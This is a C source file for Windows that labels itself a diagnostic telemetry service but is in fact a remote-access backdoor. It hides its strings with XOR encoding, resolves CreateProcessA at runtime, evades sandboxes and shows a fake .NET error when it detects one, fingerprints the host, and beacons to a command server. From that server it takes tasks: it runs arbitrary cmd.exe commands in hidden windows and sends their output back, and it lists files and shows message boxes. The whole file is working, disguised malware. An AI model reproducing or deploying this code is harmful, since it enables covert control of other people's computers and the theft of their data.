/*
 * Diagnostic telemetry service — Windows
 * Cross-compiled: x86_64-w64-mingw32-gcc
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp")
#pragma comment(lib, "ws2_32")

/* ---- CONFIG (patched at build time) ---- */
#define SH L"%%SERVER_HOST%%"
#define SP %%SERVER_PORT%%

/* ---- XOR string obfuscation ---- */
static volatile unsigned char XK_ = 0x5A;

static void xd(unsigned char *buf, int len) {
    unsigned char k = XK_;
    for (int i = 0; i < len; i++) buf[i] ^= (k ^ (i & 0xFF));
}

/* runtime decryptor into caller-provided buffer */
static void sd2(const unsigned char *enc, int len, char *buf) {
    unsigned char k = XK_;
    for (int i = 0; i < len; i++) buf[i] = enc[i] ^ (k ^ (i & 0xFF));
    buf[len] = 0;
}

static void sdw2(const unsigned char *enc, int len, wchar_t *buf) {
    unsigned char k = XK_;
    for (int i = 0; i < len; i++) buf[i] = (wchar_t)(enc[i] ^ (k ^ (i & 0xFF)));
    buf[len] = 0;
}

/* convenience macros — decrypt into stack array */
#define SD(name, enc) char name[sizeof(enc)+1]; sd2(enc, sizeof(enc), name)
#define SDW(name, enc) wchar_t name[sizeof(enc)+1]; sdw2(enc, sizeof(enc), name)

/* Pre-encrypted strings (XOR key=0x5A rotating with index) */

/* "cmd.exe /c " (11 bytes) */
static const unsigned char _s_cmd[] = {
    0x39,0x36,0x3c,0x77,0x3b,0x27,0x39,0x7d,0x7d,0x30,0x70
};
/* "/beacon" (7 bytes) */
static const unsigned char _s_bp[] = {
    0x75,0x39,0x3d,0x38,0x3d,0x30,0x32
};
/* "/tunnel" (7 bytes) */
static const unsigned char _s_tp[] = {
    0x75,0x2f,0x2d,0x37,0x30,0x3a,0x30
};
/* "task" (4 bytes) */
static const unsigned char _s_tk[] = {
    0x2e,0x3a,0x2b,0x32
};
/* "shell_command" (13 bytes) */
static const unsigned char _s_sc[] = {
    0x29,0x33,0x3d,0x35,0x32,0x00,0x3f,0x32,0x3f,0x3e,0x31,0x3f,0x32
};
/* "command" (7 bytes) */
static const unsigned char _s_cm[] = {
    0x39,0x34,0x35,0x34,0x3f,0x31,0x38
};
/* "show_message" (12 bytes) */
static const unsigned char _s_sm[] = {
    0x29,0x33,0x37,0x2e,0x01,0x32,0x39,0x2e,0x21,0x32,0x37,0x34
};
/* "message" (7 bytes) */
static const unsigned char _s_mg[] = {
    0x37,0x3e,0x2b,0x2a,0x3f,0x38,0x39
};
/* "list_files" (10 bytes) */
static const unsigned char _s_lf[] = {
    0x36,0x32,0x2b,0x2d,0x01,0x39,0x35,0x31,0x37,0x20
};
/* "path" (4 bytes) */
static const unsigned char _s_pa[] = {
    0x2a,0x3a,0x2c,0x31
};
/* "heartbeat" (9 bytes) */
static const unsigned char _s_hb[] = {
    0x32,0x3e,0x39,0x2b,0x2a,0x3d,0x39,0x3c,0x26
};
/* "tunnel_poll" (11 bytes) */
static const unsigned char _s_tpl[] = {
    0x2e,0x2e,0x36,0x37,0x3b,0x33,0x03,0x2d,0x3d,0x3f,0x3c
};
/* "task_result" (11 bytes) */
static const unsigned char _s_tr[] = {
    0x2e,0x3a,0x2b,0x32,0x01,0x2d,0x39,0x2e,0x27,0x3f,0x24
};
/* "task_response" (13 bytes) */
static const unsigned char _s_trp[] = {
    0x2e,0x3a,0x2b,0x32,0x01,0x2d,0x39,0x2e,0x22,0x3c,0x3e,0x22,0x33
};
/* "SOFTWARE\Microsoft\Cryptography" (31 bytes) */
static const unsigned char _s_rk[] = {
    0x09,0x14,0x1e,0x0d,0x09,0x1e,0x0e,0x18,0x0e,0x1e,0x39,0x32,0x24,0x38,0x27,0x3a,
    0x2c,0x3f,0x14,0x0a,0x3c,0x36,0x3c,0x39,0x2d,0x24,0x32,0x20,0x36,0x2f,0x3d
};
/* "MachineGuid" (11 bytes) */
static const unsigned char _s_mg2[] = {
    0x17,0x3a,0x3b,0x31,0x37,0x31,0x39,0x1a,0x27,0x3a,0x34
};

/* ---- Anti-sandbox / analysis evasion ---- */

static int ec_(void) {
    DWORD t1 = GetTickCount();
    Sleep(50);
    DWORD t2 = GetTickCount();
    if ((t2 - t1) < 40) return 0;

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (1ULL << 30)) return 0;

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 0;

    return 1;
}

/* ---- Constants ---- */

#define MR  (1024 * 256)
#define MC  (1024 * 128)
#define UA  L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#define TT  35000
#define RD  5000

/* ---- JSON helpers ---- */

static void je(const char *s, char *d, int m) {
    int j = 0;
    for (int i = 0; s[i] && j < m - 2; i++) {
        if (s[i] == '"')       { d[j++] = '\\'; d[j++] = '"'; }
        else if (s[i] == '\\') { d[j++] = '\\'; d[j++] = '\\'; }
        else if (s[i] == '\n') { d[j++] = '\\'; d[j++] = 'n'; }
        else if (s[i] == '\r') { d[j++] = '\\'; d[j++] = 'r'; }
        else if (s[i] == '\t') { d[j++] = '\\'; d[j++] = 't'; }
        else if ((unsigned char)s[i] >= 0x20) { d[j++] = s[i]; }
    }
    d[j] = 0;
}

static int jg(const char *json, const char *key, char *out, int mo) {
    char n[128];
    snprintf(n, sizeof(n), "\"%s\"", key);
    const char *p = strstr(json, n);
    if (!p) { out[0] = 0; return 0; }
    p = strchr(p + strlen(n), ':');
    if (!p) { out[0] = 0; return 0; }
    while (*p == ' ' || *p == ':') p++;
    if (*p == '"') {
        p++;
        int i = 0;
        while (*p && *p != '"' && i < mo - 1) {
            if (*p == '\\' && *(p + 1)) { p++; }
            out[i++] = *p++;
        }
        out[i] = 0;
        return i;
    }
    out[0] = 0;
    return 0;
}

/* ---- Dynamic API resolution ---- */

typedef BOOL (WINAPI *pCP_t)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,
    BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);

static pCP_t dCP = NULL;

static void ra(void) {
    HMODULE hK = GetModuleHandleA("kernel32.dll");
    if (hK) {
        /* "CreateProcessA" (14 bytes) */
        unsigned char _cp[] = {
            0x19,0x29,0x3d,0x38,0x2a,0x3a,0x0c,0x2f,0x3d,0x30,0x35,0x22,0x25,0x16
        };
        xd(_cp, 14);
        dCP = (pCP_t)GetProcAddress(hK, (LPCSTR)_cp);
    }
}

/* ---- System info ---- */

typedef struct { char h[256]; char u[256]; char o[256]; char p[512]; char m[64]; } SI;

static void gi(SI *i) {
    DWORD sz;
    sz = sizeof(i->h); GetComputerNameA(i->h, &sz);
    sz = sizeof(i->u); GetUserNameA(i->u, &sz);

    OSVERSIONINFOA v;
    v.dwOSVersionInfoSize = sizeof(v);
    #pragma warning(suppress: 4996)
    GetVersionExA(&v);
    snprintf(i->o, sizeof(i->o), "Windows %lu.%lu.%lu",
             v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber);

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char *a = "x";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) a = "x86_64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) a = "x86";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) a = "ARM64";
    snprintf(i->p, sizeof(i->p), "Windows-%lu.%lu.%lu-%s",
             v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber, a);

    HKEY hKey;
    i->m[0] = '0'; i->m[1] = 0;
    SD(rk, _s_rk);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rk, 0,
                      KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        DWORD type, bs = sizeof(i->m);
        SD(rv, _s_mg2);
        RegQueryValueExA(hKey, rv, NULL, &type, (LPBYTE)i->m, &bs);
        RegCloseKey(hKey);
    }
}

static int gb(void) {
    SYSTEM_POWER_STATUS ps;
    if (GetSystemPowerStatus(&ps) && ps.BatteryLifePercent <= 100)
        return ps.BatteryLifePercent;
    return -1;
}

/* ---- HTTP POST ---- */

static int hp(const wchar_t *path, const char *body, int bl,
              char *resp, int rm, DWORD tmo) {
    int ret = -1;
    HINTERNET hS = WinHttpOpen(UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return -1;
    WinHttpSetTimeouts(hS, tmo, tmo, tmo, tmo);

    HINTERNET hC = WinHttpConnect(hS, SH, SP, 0);
    if (!hC) { WinHttpCloseHandle(hS); return -1; }

    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", path, NULL,
                                      WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return -1; }

    BOOL ok = WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1,
                                 (LPVOID)body, bl, bl, 0);
    if (ok) ok = WinHttpReceiveResponse(hR, NULL);
    if (ok) {
        DWORD tr = 0, br;
        while (WinHttpReadData(hR, resp + tr, rm - tr - 1, &br) && br > 0) {
            tr += br; if ((int)tr >= rm - 1) break;
        }
        resp[tr] = 0;
        ret = (int)tr;
    }
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

/* ---- Build beacon JSON ---- */

static int bj(const SI *i, const char *mt, const char *ef, char *buf, int bs) {
    char h[512], u[512], o[512], p[1024], m[128];
    je(i->h, h, sizeof(h));
    je(i->u, u, sizeof(u));
    je(i->o, o, sizeof(o));
    je(i->p, p, sizeof(p));
    je(i->m, m, sizeof(m));

    int b = gb();
    if (b >= 0) {
        return snprintf(buf, bs,
            "{\"device\":\"%s\",\"android_id\":\"%s\","
            "\"android\":\"%s\",\"api\":\"%s\","
            "\"fingerprint\":\"%s\",\"type\":\"%s\","
            "\"os_type\":\"windows\",\"battery_pct\":%d,"
            "\"network_type\":\"LAN\",\"installed_apps_count\":\"N/A\""
            "%s%s}",
            h, m, o, u, p, mt, b,
            ef ? "," : "", ef ? ef : "");
    } else {
        return snprintf(buf, bs,
            "{\"device\":\"%s\",\"android_id\":\"%s\","
            "\"android\":\"%s\",\"api\":\"%s\","
            "\"fingerprint\":\"%s\",\"type\":\"%s\","
            "\"os_type\":\"windows\",\"battery_pct\":\"AC\","
            "\"network_type\":\"LAN\",\"installed_apps_count\":\"N/A\""
            "%s%s}",
            h, m, o, u, p, mt,
            ef ? "," : "", ef ? ef : "");
    }
}

/* ---- Execute command ---- */

static int xc(const char *cmd, char *oo, int mo, char *oe, int me) {
    HANDLE hOR, hOW, hER, hEW;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hOR, &hOW, &sa, 0)) return -1;
    if (!CreatePipe(&hER, &hEW, &sa, 0)) {
        CloseHandle(hOR); CloseHandle(hOW); return -1;
    }
    SetHandleInformation(hOR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hER, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hOW;
    si.hStdError = hEW;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    char pfx[16];
    memcpy(pfx, _s_cmd, sizeof(_s_cmd));
    xd((unsigned char*)pfx, sizeof(_s_cmd));
    pfx[sizeof(_s_cmd)] = 0;

    char cl[4096];
    snprintf(cl, sizeof(cl), "%s%s", pfx, cmd);

    BOOL ok;
    if (dCP) ok = dCP(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    else { CloseHandle(hOW); CloseHandle(hEW); CloseHandle(hOR); CloseHandle(hER); return -1; }

    CloseHandle(hOW);
    CloseHandle(hEW);

    int ec = -1;
    if (ok) {
        WaitForSingleObject(pi.hProcess, 25000);
        DWORD dw;
        if (GetExitCodeProcess(pi.hProcess, &dw)) ec = (int)dw;
        if (dw == STILL_ACTIVE) { TerminateProcess(pi.hProcess, 1); ec = -1; }

        DWORD tr = 0, br;
        while (ReadFile(hOR, oo + tr, mo - tr - 1, &br, NULL) && br > 0) {
            tr += br; if ((int)tr >= mo - 1) break;
        }
        oo[tr] = 0;
        tr = 0;
        while (ReadFile(hER, oe + tr, me - tr - 1, &br, NULL) && br > 0) {
            tr += br; if ((int)tr >= me - 1) break;
        }
        oe[tr] = 0;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hOR);
    CloseHandle(hER);
    return ec;
}

/* ---- Handle task ---- */

static void ht(const SI *info, const char *jr) {
    char tk[64], cm[4096];
    SD(s_tk, _s_tk);
    jg(jr, s_tk, tk, sizeof(tk));

    SD(s_sc, _s_sc);
    SD(s_cm, _s_cm);
    SD(s_sm, _s_sm);
    SD(s_lf, _s_lf);

    if (strcmp(tk, s_sc) == 0) {
        jg(jr, s_cm, cm, sizeof(cm));
        char *co = (char*)malloc(MC);
        char *ce = (char*)malloc(MC);
        if (!co || !ce) { free(co); free(ce); return; }
        co[0] = ce[0] = 0;
        int ec = xc(cm, co, MC, ce, MC);

        char *eo = (char*)malloc(MC * 2);
        char *ee = (char*)malloc(MC * 2);
        char *ecm = (char*)malloc(8192);
        char *ex = (char*)malloc(MC * 4 + 16384);
        if (eo && ee && ecm && ex) {
            je(co, eo, MC * 2);
            je(ce, ee, MC * 2);
            je(cm, ecm, 8192);

            SD(s_tr2, _s_tr);
            snprintf(ex, MC * 4 + 16384,
                "\"task\":\"%s\",\"command\":\"%s\","
                "\"stdout\":\"%s\",\"stderr\":\"%s\",\"exit_code\":%d",
                s_sc, ecm, eo, ee, ec);

            char *body = (char*)malloc(MC * 4 + 32768);
            if (body) {
                SDW(bp, _s_bp);
                int n = bj(info, s_tr2, ex, body, MC * 4 + 32768);
                char *rsp = (char*)malloc(4096);
                if (rsp) { hp(bp, body, n, rsp, 4096, 10000); free(rsp); }
                free(body);
            }
        }
        free(eo); free(ee); free(ecm); free(ex);
        free(co); free(ce);
    }
    else if (strcmp(tk, s_sm) == 0) {
        char msg[2048];
        SD(s_m, _s_mg);
        jg(jr, s_m, msg, sizeof(msg));
        MessageBoxA(NULL, msg, "System", MB_OK | MB_ICONINFORMATION);

        char extra[256];
        snprintf(extra, sizeof(extra), "\"task\":\"%s\",\"status\":\"displayed\"", s_sm);
        SD(s_tr2, _s_tr);
        SDW(bp, _s_bp);
        char body[8192];
        int n = bj(info, s_tr2, extra, body, sizeof(body));
        char rsp[1024];
        hp(bp, body, n, rsp, sizeof(rsp), 10000);
    }
    else if (strcmp(tk, s_lf) == 0) {
        char dp[4096];
        SD(s_p, _s_pa);
        jg(jr, s_p, dp, sizeof(dp));
        if (!dp[0]) { dp[0] = 'C'; dp[1] = ':'; dp[2] = '\\'; dp[3] = 0; }

        WIN32_FIND_DATAA fd;
        char search[4200];
        snprintf(search, sizeof(search), "%s\\*", dp);

        char *fj = (char*)malloc(MC);
        if (!fj) return;
        int pos = 0, cnt = 0;
        pos += snprintf(fj + pos, MC - pos, "[");

        HANDLE hF = FindFirstFileA(search, &fd);
        if (hF != INVALID_HANDLE_VALUE) {
            do {
                if (fd.cFileName[0] == '.' && (fd.cFileName[1] == 0 ||
                    (fd.cFileName[1] == '.' && fd.cFileName[2] == 0))) continue;
                int id = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
                ULARGE_INTEGER fs;
                fs.LowPart = fd.nFileSizeLow;
                fs.HighPart = fd.nFileSizeHigh;
                char en[512];
                je(fd.cFileName, en, sizeof(en));
                if (cnt > 0 && pos < MC - 2) fj[pos++] = ',';
                pos += snprintf(fj + pos, MC - pos,
                    "{\"name\":\"%s\",\"is_dir\":%s,\"size\":%llu,\"modified\":0,\"readable\":true}",
                    en, id ? "true" : "false", (unsigned long long)fs.QuadPart);
                cnt++;
                if (pos >= MC - 256) break;
            } while (FindNextFileA(hF, &fd));
            FindClose(hF);
        }
        pos += snprintf(fj + pos, MC - pos, "]");

        char ep[8192];
        je(dp, ep, sizeof(ep));

        SD(s_trp2, _s_trp);
        char *ex = (char*)malloc(MC + 16384);
        if (ex) {
            snprintf(ex, MC + 16384,
                "\"task\":\"%s\",\"path\":\"%s\",\"files\":%s,\"file_count\":%d",
                s_lf, ep, fj, cnt);
            char *b2 = (char*)malloc(MC + 32768);
            if (b2) {
                SDW(bp, _s_bp);
                int n2 = bj(info, s_trp2, ex, b2, MC + 32768);
                char r2[4096];
                hp(bp, b2, n2, r2, sizeof(r2), 10000);
                free(b2);
            }
            free(ex);
        }
        free(fj);
    }
}

/* ---- Entry point ---- */

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int ns) {
    (void)hI; (void)hP; (void)lp; (void)ns;

    if (!ec_()) {
        MessageBoxA(NULL,
            "This application requires .NET Framework 4.8.\n"
            "Please install it from microsoft.com and try again.",
            "Runtime Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    srand(GetTickCount());
    Sleep(1000 + (rand() % 4000));

    ra();

    SI info;
    gi(&info);

    char *body = (char*)malloc(8192);
    char *resp = (char*)malloc(MR);
    if (!body || !resp) return 1;

    SD(s_hb, _s_hb);
    SDW(bp, _s_bp);
    SDW(tp, _s_tp);
    SD(s_tk, _s_tk);
    SD(s_tpl, _s_tpl);

    int n = bj(&info, s_hb, NULL, body, 8192);
    hp(bp, body, n, resp, 4096, 10000);

    while (1) {
        n = bj(&info, s_tpl, NULL, body, 8192);
        int ret = hp(tp, body, n, resp, MR, TT);

        if (ret > 0) {
            char tk[64];
            jg(resp, s_tk, tk, sizeof(tk));
            if (tk[0]) ht(&info, resp);
        } else {
            Sleep(RD);
        }
        Sleep(rand() % 2000);
    }

    free(body);
    free(resp);
    return 0;
}
